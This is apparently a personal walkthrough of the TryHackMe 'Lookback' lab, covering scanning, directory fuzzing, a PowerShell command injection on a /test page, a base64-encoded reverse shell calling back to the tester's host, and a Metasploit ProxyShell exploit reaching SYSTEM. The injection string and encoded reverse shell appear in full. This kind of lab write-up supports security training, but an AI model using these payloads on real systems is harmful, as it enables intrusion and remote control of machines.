---
lab: "Lookback"
date: "2026-10-17"
platform: "TryHackMe"
difficulty: "Easy"
---
# Room link: https://tryhackme.com/room/lookback

![](../Attachments/Pasted%20image%2020261017222921.png)

# Nmap scan

```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  https?
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-17T14:32:50+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2026-10-16T14:26:38
|_Not valid after:  2027-04-17T14:26:38
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Port 80 is inaccessible. This is Port 443. 

![](../Attachments/Pasted%20image%2020261017225224.png)

I tried default credentials but it says it doesn't have a mailbox.

![](../Attachments/Pasted%20image%2020261018000425.png)
# Fuzz

I used `ffuf` to perform directory fuzzing.

```bash
$ ffuf -u https://thm.local/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs 0  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev

test                    [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 200ms]
Test                    [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 205ms]
owa                     [Status: 302, Size: 201, Words: 6, Lines: 4, Duration: 197ms]
```

on the `/test` directory, it contains the first flag.

# Service flag

![](../Attachments/Pasted%20image%2020261017225456.png)

Notice that there is a `Run` button. When I clicked it, it gives an output. 

![](../Attachments/Pasted%20image%2020261017230101.png)

I can't  really make anything off of that so I tried `id`.

![](../Attachments/Pasted%20image%2020261017230139.png)

This is interesting. The button performs `Get-Content C:\<input>`. I can read sensitive files with this.

Using `Wappalyzer`, it shows the framework of the web page which is `ASP.net`.

![](../Attachments/Pasted%20image%2020261017230521.png)

## inetpub\wwwroot\web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <location inheritInChildApplications="false">
    <system.webServer>
      <serverRuntime appConcurrentRequestLimit="65535" uploadReadAheadSize="0" />
      <modules>
        <!-- Standard set of module removes for reducing per-request memory footprint and to reduce native/managed context switches -->
        <remove name="CustomErrorModule" />
        <remove name="DefaultAuthentication" />
        <remove name="DirectoryListingModule" />
        <remove name="DynamicCompressionModule" />
        <remove name="FileAuthorization" />
        <remove name="FormsAuthentication" />
        <remove name="HttpCacheModule" />
        <remove name="OutputCache" />
        <remove name="Profile" />
        <remove name="ProtocolSupportModule" />
        <remove name="RequestFilteringModule" />
        <remove name="RoleManager" />
        <remove name="ScriptModule-4.0" />
        <remove name="ServiceModel" />
        <remove name="ServiceModel-4.0" />
        <remove name="Session" />
        <remove name="StaticCompressionModule" />
        <remove name="UrlAuthorization" />
        <remove name="UrlMappingsModule" />
        <remove name="UrlRoutingModule-4.0" />

        <!-- Keep the HostHeaderValidationModule first - it prevents excessive and unnecessary Watsons that result from bogus host headers -->
        <add name="HostHeaderValidationModule" type="Microsoft.Exchange.HttpUtilities.HostHeaderValidationModule, Microsoft.Exchange.HttpUtilities, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
        <add name="OwaJavascriptRedirectModule" type="Microsoft.Exchange.HttpRedirect.OwaJavascriptRedirectModule, Microsoft.Exchange.HttpRedirectModules, Version=15.0.0.0,Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      </modules>
    </system.webServer>
    <system.web>
      <machineKey validationKey="AutoGenerate,IsolateApps" />
      <compilation defaultLanguage="c#" debug="false">
        <assemblies>
          <add assembly="Microsoft.Exchange.HttpRedirectModules, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
        </assemblies>
      </compilation>
    </system.web>
  </location>
  <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
    <linkedConfiguration href="file://C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\SharedWebConfig.config" />
  </assemblyBinding>
    <system.web>
        <identity impersonate="false" />
        <authorization>
            <allow users="admin" />
        </authorization>
        <roleManager enabled="true" />
        <authentication mode="Windows" />
    </system.web>
</configuration>
```

It allows me to read specific files but it won't allow generic directory listing. 

![](../Attachments/Pasted%20image%2020261017233040.png)

This output gave me an idea. Escaping the function string by adding `')` and the end and add a separator `;` then add an actual command. 

![](../Attachments/Pasted%20image%2020261017233624.png)

Okay, it gave me a different error about a missing terminator.

![](../Attachments/Pasted%20image%2020261017234029.png)

After testing few ones, this payload worked because the `')` closes the quote and function call. Now the semicolon is outside quotes, so the 2nd command runs as a separate command. The `; ('` at the end fixes the syntax error.

```powershell
Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2023  11:44 AM                934484d0a9de05fc41a4dc84                                              
d-----        1/26/2023  10:36 AM                ExchangeSetupLogs                                                     
d-----        1/25/2023  12:12 PM                inetpub                                                               
d-----        9/15/2018  12:19 AM                PerfLogs                                                              
d-r---        2/28/2023   2:23 PM                Program Files                                                         
d-----        1/25/2023  11:41 AM                Program Files (x86)                                                   
d-----        1/25/2023   1:34 PM                root                                                                  
d-r---        1/26/2023   1:16 PM                Users                                                                 
d-----        3/29/2023   2:34 AM                Windows                                                               
-a----       10/17/2026   8:15 AM             31 BitlockerActiveMonitoringLogs
```

## User flag

```powershell
Directory: C:\Users\dev\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/21/2023  12:28 PM            512 TODO.txt                                                              
-a----        2/12/2023  11:53 AM             29 user.txt
```

![](../Attachments/Pasted%20image%2020261017234700.png)

# TODO.txt

```powershell
List generated at 3:15:53 PM.
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

I tried brute forcing for password but did not get anything. I went back on `/test` dir to do more enumeration. 

##### whoami

```powershell
thm\admin
```

This is the same user on the guest credential. Since I did not find valid credentials using the usernames on `TODO.txt` and I can perform code executions on `/test`, i will try to pop a shell.

I encoded a reverse shell payload from revshells.com

```bash
powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMwA1AC4AMQA2ADcAIgAsADkAMAAwADEAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAwACkAewAkAGQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAdAByAHkAewAkAG8APQBpAGUAeAAgACQAZAAgADIAPgAmADEAIAAzAD4AJgAxACAANAA+ACYAMQAgADUAPgAmADEAIAA2AD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwB9AGMAYQB0AGMAaAB7ACQAbwA9ACQAXwB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBpAGYAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBFAG0AcAB0AHkAKAAkAG8AKQApAHsAJABvAD0AIgAiAH0AJABwAD0AIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwBbAGIAeQB0AGUAWwBdAF0AJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwArACQAcAApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=
```

Enter on `/test`.

```txt
BitlockerActiveMonitoringLogs') ; powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMwA1AC4AMQA2ADcAIgAsADkAMAAwADEAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAwACkAewAkAGQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAdAByAHkAewAkAG8APQBpAGUAeAAgACQAZAAgADIAPgAmADEAIAAzAD4AJgAxACAANAA+ACYAMQAgADUAPgAmADEAIAA2AD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwB9AGMAYQB0AGMAaAB7ACQAbwA9ACQAXwB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBpAGYAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBFAG0AcAB0AHkAKAAkAG8AKQApAHsAJABvAD0AIgAiAH0AJABwAD0AIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwBbAGIAeQB0AGUAWwBdAF0AJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwArACQAcAApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA= ; ('
```

# Foothold

```bash
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.135.167] from (UNKNOWN) [10.144.177.36] 9008
whoami
thm\admin
PS C:\windows\system32\inetsrv> whoami /priv
```

After deep internal enumeration, I decided to use `metasploit` to see if this `exchange server` has flaws. 

I search `exchange` and just tried `excellent` ranked exploits. lol 

```bash
msf exploit(windows/http/exchange_proxyshell_rce) > options

Module options (exploit/windows/http/exchange_proxyshell_rce):

   Name              Current Setting                    Required  Description
   ----              ---------------                    --------  -----------
   EMAIL             dev-infrastracture-team@thm.local  no        A known email address for this organization
   Proxies                                              no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, http, socks4, socks5, socks5h
   RHOSTS            10.144.177.36                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             443                                yes       The target port (TCP)
   SRVHOST                                              no        The local host to listen on and use for incoming connections
   SRVSSL            true                               no        Negotiate SSL/TLS for local server connections
   SSL               true                               no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                              no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                              no        The URI to use for this exploit (default is random)
   UseAlternatePath  false                              yes       Use the IIS root dir as alternate path
   VHOST                                                no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVPORT  8080             yes       The local port to listen on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port
```

It worked and now, I have access as `NT Authority\System`

```bash
meterpreter > shell
Process 7132 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```

# Root Flag

```powershell
PS C:\root> type C:\Users\Administrator\Documents\flag.txt
type C:\Users\Administrator\Documents\flag.txt
THM{REDACTED}

```